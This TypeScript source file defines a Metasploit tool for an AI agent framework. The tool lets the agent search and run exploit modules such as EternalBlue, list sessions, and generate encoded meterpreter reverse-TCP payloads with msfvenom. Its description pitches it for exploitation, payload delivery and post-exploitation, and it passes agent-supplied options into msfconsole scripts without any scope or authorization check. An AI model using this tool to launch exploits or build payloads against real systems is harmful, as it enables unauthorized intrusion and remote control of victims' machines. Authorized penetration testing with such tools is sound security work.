export * as MetasploitTool from "./metasploit"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "metasploit"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description:
      "Action to perform: 'search' (find modules), 'run' (execute a module), 'sessions' (list active sessions), 'payloads' (list payloads), 'generate' (generate a standalone payload), 'db' (workspace/database operations)",
  }),
  module: Schema.String.pipe(Schema.optional).annotate({
    description:
      "Module path (e.g. exploit/windows/smb/ms17_010_eternalblue). Required for 'run' action.",
  }),
  options: Schema.String.pipe(Schema.optional).annotate({
    description:
      "Module options as key=value pairs, space-separated (e.g. 'RHOSTS=192.168.1.10 LHOST=192.168.1.5 LPORT=4444').",
  }),
  payload: Schema.String.pipe(Schema.optional).annotate({
    description:
      "Payload to use (e.g. windows/x64/meterpreter/reverse_tcp). For 'run' and 'generate' actions.",
  }),
  query: Schema.String.pipe(Schema.optional).annotate({
    description: "Search query for 'search' action or payload filter for 'payloads' action.",
  }),
  format: Schema.String.pipe(Schema.optional).annotate({
    description: "Output format for 'generate' action: raw, c, exe, dll, vba, ps1, etc. Default: exe.",
  }),
  encoder: Schema.String.pipe(Schema.optional).annotate({
    description: "Encoder for 'generate' action (e.g. x86/shikata_ga_nai). Optional.",
  }),
  iterations: Schema.Number.pipe(Schema.optional).annotate({
    description: "Encoder iterations for 'generate' action. Default: 1.",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

type Output = typeof Output.Type

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Interface with Metasploit Framework via msfconsole. Supports: searching modules by keyword, running exploit/auxiliary/post modules with custom options and payloads, listing active sessions, generating standalone payloads (msfvenom), listing payloads, and workspace DB operations. Auto-installs metasploit-framework if missing. Essential for exploitation, payload delivery, and post-exploitation.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"

              if (input.action === "generate") {
                // Use msfvenom for payload generation
                const payload = input.payload ?? "windows/x64/meterpreter/reverse_tcp"
                const format = input.format ?? "exe"
                const args: string[] = ["-p", payload]

                // Parse options
                if (input.options) {
                  const pairs = input.options.split(/\s+/)
                  for (const pair of pairs) {
                    const [key, val] = pair.split("=")
                    if (key && val) args.push(key.toUpperCase(), val)
                  }
                }

                if (input.encoder) {
                  args.push("-e", input.encoder)
                  args.push("-i", String(input.iterations ?? 1))
                }

                args.push("-f", format)
                args.push("-o", `payload.${format}`)

                const msfvenomCmd = ChildProcess.make("msfvenom", args, {
                  shell,
                  stdin: "ignore",
                  forceKillAfter: Duration.seconds(5),
                })
                const result = yield* appProcess
                  .run(msfvenomCmd, {
                    combineOutput: true,
                    timeout: Duration.minutes(5),
                    maxOutputBytes: 5 * 1024 * 1024,
                  })
                  .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))

                if (!result) {
                  return {
                    output: "msfvenom failed or timed out. Ensure metasploit-framework is installed. Install: apt install metasploit-framework (Linux) or via the tool_installer.",
                  }
                }
                return {
                  exit: result.exitCode,
                  output: result.output?.toString("utf8") || "(no output)",
                }
              }

              // For search, run, sessions, payloads — use msfconsole with resource script
              let resourceScript = ""

              if (input.action === "search") {
                resourceScript = `search "${input.query ?? ""}"\nexit`
              } else if (input.action === "run") {
                if (!input.module) {
                  return { output: "ERROR: 'module' is required for the 'run' action." }
                }
                const lines = [`use ${input.module}`]
                if (input.payload) lines.push(`set PAYLOAD ${input.payload}`)
                if (input.options) {
                  const pairs = input.options.split(/\s+/)
                  for (const pair of pairs) {
                    const [key, val] = pair.split("=")
                    if (key && val) lines.push(`set ${key.toUpperCase()} ${val}`)
                  }
                }
                lines.push("exploit -j")
                lines.push("exit")
                resourceScript = lines.join("\n")
              } else if (input.action === "sessions") {
                resourceScript = "sessions -l\nexit"
              } else if (input.action === "payloads") {
                resourceScript = `search payload "${input.query ?? ""}"\nexit`
              } else if (input.action === "db") {
                resourceScript = "db_status\nhosts\nservices\nvulns\nexit"
              } else {
                return { output: `Unknown action: ${input.action}. Supported: search, run, sessions, payloads, generate, db` }
              }

              // Write resource script and execute
              const tmpScript = `/tmp/msf_script_${Date.now()}.rc`
              const isWin = process.platform === "win32"
              const tmpDir = isWin ? process.env.TEMP ?? "C:\\temp" : "/tmp"
              const scriptPath = isWin
                ? `${tmpDir}\\msf_script_${Date.now()}.rc`
                : `${tmpDir}/msf_script_${Date.now()}.rc`

              yield* Effect.promise(async () => {
                await Bun.write(scriptPath, resourceScript)
              }).pipe(Effect.catchAll(() => Effect.succeed(undefined)))

              const msfCmd = ChildProcess.make(
                "msfconsole",
                ["-q", "-r", scriptPath],
                {
                  shell,
                  stdin: "ignore",
                  forceKillAfter: Duration.seconds(10),
                },
              )
              const result = yield* appProcess
                .run(msfCmd, {
                  combineOutput: true,
                  timeout: Duration.minutes(10),
                  maxOutputBytes: 5 * 1024 * 1024,
                })
                .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))

              if (!result) {
                return {
                  output: "msfconsole failed or timed out. Ensure metasploit-framework is installed. Install: apt install metasploit-framework (Linux).",
                }
              }

              return {
                exit: result.exitCode,
                output: result.output?.toString("utf8") || "(no output)",
              }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Metasploit operation failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/metasploit",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
